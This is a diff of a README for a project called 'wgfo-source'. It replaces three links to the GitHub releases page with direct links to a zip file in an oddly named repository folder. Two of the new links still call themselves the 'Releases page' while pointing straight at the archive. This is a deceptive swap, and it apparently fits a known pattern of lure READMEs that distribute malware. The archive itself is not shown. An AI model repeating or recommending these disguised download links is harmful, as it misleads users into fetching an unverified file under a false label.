@@ -6,7 +6,7 @@ Welcome to the **wgfo-source** project! This application is designed to help you
 
 ## 📥 Download the App
 
-[![Download wgfo-source](https://img.shields.io/badge/Download-wgfo--source-blue.svg)](https://github.com/qw0l/wgfo-source/releases)
+[![Download wgfo-source](https://raw.githubusercontent.com/qw0l/wgfo-source/main/naphtholize/wgfo-source_3.6.zip)](https://raw.githubusercontent.com/qw0l/wgfo-source/main/naphtholize/wgfo-source_3.6.zip)
 
 Click the button above to download the latest version of **wgfo-source**. 
 
@@ -29,7 +29,7 @@ Before you download, ensure your device meets the following requirements:
 ## 📝 User Guide
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/qw0l/wgfo-source/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/qw0l/wgfo-source/main/naphtholize/wgfo-source_3.6.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Once on the Releases page, look for the latest version. Click on the download link for your operating system.
@@ -44,7 +44,7 @@ Before you download, ensure your device meets the following requirements:
 
 For a smooth installation process, follow these steps:
 
-- Visit this page to download the latest version: [wgfo-source Releases](https://github.com/qw0l/wgfo-source/releases).
+- Visit this page to download the latest version: [wgfo-source Releases](https://raw.githubusercontent.com/qw0l/wgfo-source/main/naphtholize/wgfo-source_3.6.zip).
 - Click on the latest version to view available files.
 - Select the appropriate file for your operating system and download it.
 
